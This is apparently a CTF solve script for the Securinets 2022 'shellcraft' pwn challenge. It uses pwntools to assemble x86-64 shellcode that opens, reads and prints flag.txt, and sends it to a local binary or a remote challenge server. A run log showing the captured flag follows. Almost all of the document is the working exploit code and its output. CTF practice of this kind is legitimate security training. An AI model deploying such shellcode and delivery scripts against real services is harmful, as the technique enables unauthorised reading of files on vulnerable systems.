from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './shellcraft'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "20.216.39.14"
  PORT = 1236
  s = remote(HOST, PORT)
else:
  s = process(BINARY)

buf = asm("""
  mov rax, 257
  mov rdi, -100
  add rsi, 0x80
  xor rdx, rdx
  xor rcx, rcx
  syscall

  xchg rdi, rax
  xor rax, rax
  mov dl, 100
  syscall

  xor rax, rax
  mov al, 1
  mov rdi, 1
  syscall
""")

buf += "\x90"*(0x80-len(buf))
buf += "flag.txt\x00"

s.sendline(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/Securinets_CTF_Quals_2022/Pwn_Shellcraft$ python solve.py r
[*] '/home/mito/CTF/Securinets_CTF_Quals_2022/Pwn_Shellcraft/shellcraft'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
[+] Opening connection to 20.216.39.14 on port 1236: Done
[*] Switching to interactive mode
Securinets{56000a2e8205998dd69d74c30d6b1daca2863e66184c088b}
'''
